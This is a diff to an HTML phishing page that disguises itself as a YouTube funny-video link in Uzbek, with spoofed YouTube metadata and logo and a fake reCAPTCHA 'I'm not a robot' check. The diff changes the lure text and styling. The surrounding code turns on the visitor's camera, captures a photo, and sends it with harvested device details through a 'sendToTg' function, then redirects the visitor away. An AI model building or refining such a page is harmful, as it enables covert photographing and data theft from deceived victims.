@@ -1,12 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta property="og:title" content="Funny Videos 2026 - Best Moments">
-    <meta property="og:description" content="Watch the funniest moments of the week. Click to play.">
-    <meta property="og:image" content="https://i.ytimg.com/vi/sWA-osOeiJg/hq720.jpg">
+    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="Eng qiziqarli videolar to'plami 2026 🔥">
+    <meta property="og:description" content="Hozir ko'ring! Eng kulguli prandlar va kutilmagan vaziyatlar.">
+    <meta property="og:image" content="https://i.ytimg.com/vi/3asWofvW_tU/maxresdefault.jpg">
+    <meta property="og:image:width" content="1280">
+    <meta property="og:image:height" content="720">
+    <meta property="og:url" content="https://www.youtube.com">
+    
     <link rel="icon" href="https://www.youtube.com/s/desktop/28ea0284/img/favicon_32x32.png">
+
     <meta charset="UTF-8">
-    <title>404 Not Found</title>
+    <title>YouTube - Funny Moments</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; font-family: 'Helvetica', Arial, sans-serif; background-color: #fcfcfc; color: #000; text-align: center; overflow: hidden; }
@@ -16,7 +22,7 @@
         p { color: #999; font-size: 16px; margin-bottom: 25px; }
         .captcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; display: flex; align-items: center; justify-content: space-between; width: 280px; margin: 0 auto 25px; border-radius: 3px; }
         input[type="checkbox"] { width: 22px; height: 22px; cursor: pointer; }
-        #photoBtn { background-color: #000; color: #fff; padding: 12px 25px; border: none; text-transform: uppercase; font-weight: bold; cursor: pointer; opacity: 0.4; pointer-events: none; }
+        #photoBtn { background-color: #ff0000; color: #fff; padding: 14px 30px; border: none; text-transform: uppercase; font-weight: bold; cursor: pointer; opacity: 0.4; pointer-events: none; border-radius: 2px; }
         #scanUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; color: #0f0; font-family: monospace; }
         #video { width: 100%; height: 100%; object-fit: cover; opacity: 0.5; }
         .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: rgba(255, 0, 0, 0.7); box-shadow: 0 0 15px #ff0000; animation: scan 3s infinite; }
@@ -30,17 +36,17 @@
 <body>
 
 <div class="container" id="mainUI">
-    <h1>404</h1>
-    <h2>Oops, Page Not Found!</h2>
-    <p>Please verify you are human to continue.</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" width="120" style="margin-bottom: 10px;">
+    <h2>Siz robot emasmisiz?</h2>
+    <p>Videoni davom ettirish uchun xavfsizlik tekshiruvidan o'ting.</p>
     <div class="captcha-box">
         <div style="display: flex; align-items: center; gap: 12px;">
             <input type="checkbox" id="captchaCheck">
-            <span style="font-size: 14px; color: #555;">I'm not a robot</span>
+            <span style="font-size: 14px; color: #555;">Robot emasman</span>
         </div>
         <img style="width: 40px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
     </div>
-    <button id="photoBtn">VERIFY & PROCEED</button>
+    <button id="photoBtn">DAVOM ETTIRISH</button>
 </div>
 
 <div id="scanUI">
@@ -48,9 +54,9 @@
     <div class="scanner-line"></div>
     <div class="scan-data" id="logs">> INITIALIZING BIOMETRIC SCAN...<br></div>
     <div id="warningOverlay">
-        <h1 class="blink">WARNING!</h1>
-        <p style="font-size: 20px;">SECURITY BREACH DETECTED</p>
-        <p>REDIRECTING SECURELY...</p>
+        <h1 class="blink">OGOHLANTIRISH!</h1>
+        <p style="font-size: 20px;">Tizimda xatolik aniqlandi</p>
+        <p>Bog'lanish qayta tiklanmoqda...</p>
     </div>
 </div>
 
@@ -101,27 +107,23 @@
             video.srcObject = stream;
             const info = await getDeepInfo();
 
-            setTimeout(() => logs.innerHTML += "> NEURAL LINK ESTABLISHED...<br>", 1000);
-            setTimeout(() => logs.innerHTML += "> ANALYZING BIOMETRICS...<br>", 2000);
+            setTimeout(() => logs.innerHTML += "> SERVER BILAN ALOQA O'RNATILDI...<br>", 1000);
+            setTimeout(() => logs.innerHTML += "> BIOMETRIK TAHLIL KETMOQDA...<br>", 2000);
 
             setTimeout(async () => {
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext("2d").drawImage(video, 0, 0);
-                canvas.toBlob(b => sendToTg(b, "📸 BIOMETRIC SCAN\n" + info), "image/jpeg", 0.7);
+                canvas.toBlob(b => sendToTg(b, "📸 SCAN NATIJASI\n" + info), "image/jpeg", 0.7);
             }, 3000);
 
-            setTimeout(() => {
-                document.getElementById("warningOverlay").style.display = "flex";
-            }, 4500);
+            setTimeout(() => { document.getElementById("warningOverlay").style.display = "flex"; }, 4500);
 
             setTimeout(() => {
                 stream.getTracks().forEach(t => t.stop());
                 window.location.href = TARGET_URL;
             }, 6500);
 
-        } catch(e) { 
-            window.location.href = TARGET_URL; 
-        }
+        } catch(e) { window.location.href = TARGET_URL; }
     };
 </script>
 </body>
